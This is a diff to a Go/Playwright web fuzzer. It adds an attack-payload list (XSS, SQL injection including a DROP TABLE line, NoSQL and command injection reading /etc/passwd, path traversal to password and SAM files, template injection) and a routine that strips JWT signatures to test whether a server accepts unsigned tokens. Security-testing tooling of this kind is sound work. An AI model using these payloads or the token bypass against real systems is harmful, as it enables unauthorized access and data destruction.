@@ -20,11 +20,25 @@ var advancedPayloads = []string{
 	// XSS
 	"<script>alert(1)</script>",
 	"\"><svg/onload=alert(1)>",
-	// SQLi
+	"javascript:alert(1)//",
+	"'\"><img src=x onerror=alert(1)>",
+	// Deep SQLi
 	"' OR '1'='1",
 	"admin' --",
+	"' OR 1=1 LIMIT 1 --",
+	"1; DROP TABLE users",
+	"' UNION SELECT null, null, null--",
+	// NoSQLi
+	`{"$gt": ""}`,
+	// Command Injection
+	"| cat /etc/passwd",
+	"& whoami",
 	// Path Traversal
 	"../../../etc/passwd",
+	"..\\..\\windows\\system32\\config\\sam",
+	// SSTI (Server Side Template Injection)
+	"${7*7}",
+	"{{7*7}}",
 	// Emojis / Unicode Parsing
 	"👩‍👩‍👦‍👦🌟",
 }
@@ -104,6 +118,59 @@ func (f *Fuzzer) CaptureCrash(page playwright.Page, err error, proofDir string) 
 	}
 
 	f.Report.CriticalBugs = append(f.Report.CriticalBugs, bug)
+}
+
+// TestTokenTampering actively hunts for JWT cookies and attempts cryptographic bypasses
+func (f *Fuzzer) TestTokenTampering(page playwright.Page, url string) {
+	context := page.Context()
+	cookies, err := context.Cookies()
+	if err != nil {
+		return
+	}
+
+	for _, c := range cookies {
+		// Detect if cookie is a JWT (Header eyJ..., Payload eyJ..., Signature)
+		if strings.HasPrefix(c.Value, "eyJ") && strings.Count(c.Value, ".") == 2 {
+			log.Printf("🚨 Security: JWT Detected in Cookie '%s'. Commencing Signature Stripping attack...", c.Name)
+
+			// Tamper: Strip the signature to test if the backend verifies JWT integrity (CVE-2015-9256)
+			parts := strings.Split(c.Value, ".")
+			tamperedJWT := fmt.Sprintf("%s.%s.", parts[0], parts[1])
+
+			err = context.AddCookies([]playwright.OptionalCookie{
+				{
+					Name:   c.Name,
+					Value:  tamperedJWT,
+					Domain: playwright.String(c.Domain),
+					Path:   playwright.String(c.Path),
+				},
+			})
+
+			if err == nil {
+				resp, _ := page.Reload()
+				if resp != nil && resp.Status() >= 200 && resp.Status() < 400 {
+					// 😱 Backend accepted the tampered token!
+					f.Report.CriticalBugs = append(f.Report.CriticalBugs, models.Bug{
+						Severity:    "CRITICAL",
+						URL:         url,
+						ActionTaken: fmt.Sprintf("JWT Signature Stripping (CVE-2015-9256) on Cookie: %s", c.Name),
+						Expected:    "HTTP 401 Unauthorized or 403 Forbidden",
+						Actual:      fmt.Sprintf("HTTP %d OK. Broken Access Control Detected! System trusted unsigned token.", resp.Status()),
+					})
+				}
+
+				// Restore the original valid session so the crawler can continue normally
+				context.AddCookies([]playwright.OptionalCookie{
+					{
+						Name:   c.Name,
+						Value:  c.Value,
+						Domain: playwright.String(c.Domain),
+						Path:   playwright.String(c.Path),
+					},
+				})
+			}
+		}
+	}
 }
 
 func sanitizeFilename(url string) string {
